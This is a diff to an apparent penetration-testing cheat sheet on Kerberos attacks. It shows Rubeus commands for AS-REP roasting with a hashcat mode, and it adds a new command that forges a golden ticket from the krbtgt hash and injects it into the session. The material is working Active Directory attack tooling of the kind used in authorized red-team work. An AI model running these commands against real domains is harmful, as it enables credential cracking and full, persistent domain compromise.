@@ -56,3 +56,8 @@ A ticket is prefixed with `$krb5tgs$23$*`, where `23` is `RC4` (type 23):
 .\Rubeus.exe asreproast /user:[user] /nowrap /format:hashcat
 ```
 > Hashcat mode : 18200
+
+### Create a golden ticket
+```PowerShell
+.\Rubeus.exe golden /rc4:[krbtgt-acc-nthash] /domain:[domain] /sid:[domain-sid] /sids:[additional-sids] /user:[user] /ptt
+```
